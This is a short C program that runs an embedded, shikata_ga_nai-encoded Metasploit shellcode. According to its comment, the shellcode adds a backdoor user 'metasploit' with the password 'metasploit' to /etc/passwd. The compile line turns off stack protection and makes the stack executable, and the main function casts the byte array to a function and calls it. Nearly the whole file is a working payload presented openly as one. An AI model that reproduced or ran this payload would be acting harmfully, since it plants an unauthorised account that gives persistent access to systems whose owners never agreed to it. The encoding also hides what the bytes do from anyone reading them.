#include<stdio.h>
#include<string.h>

/*

Compilation: gcc -fno-stack-protector -z execstack shellcode2.c -o shellcode2
Execution: ./shellcode

Description: The shellcode adds a user metasploit having password metasploit.
	     The user can be removed by just removing /etc/passwd entry of
	     the metasploit user.
	     The shellcode is encode by x86/shikata_ga_nai encoder

*/

unsigned char shellcode[] =  \

"\xba\x92\x07\x1f\x02\xdd\xc1\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x19\x83\xc3\x04\x31\x53\x0f\x03\x53\x9d\xe5\xea\x33\x68\x60"
"\xdf\x5e\x2c\x2b\x2d\x1e\xda\xce\xf5\x2e\xd3\x80\x6d\x22\x90"
"\x55\x0a\xac\x79\xb5\xa2\x4d\xed\xe6\x27\xfa\x8e\x71\x44\x43"
"\xe5\x86\x46\xc4\x96\x6f\x70\xc5\x98\x6f\xec\xa0\xec\x0e\x9d"
"\x5a\x60\xbe\x08\xef\x42\x01\xb1\x20\xd6\xc8\x36\x55\x22\xbb"
"\x8c\xe0\x18\x58\xd7\xc2\xa6\xae\x1d\x19\xf9\xf4\x4e\x3f\x6c"
"\x67\xbe\xcc\x06\x7d\x99\xb9\x87\x7d\x73\xba\x7f\xb3\x04\xa8"
"\x7e\x13\xc8\xad";

main()
{
	
	printf("Shellcode length: %d\n",strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();
	
}
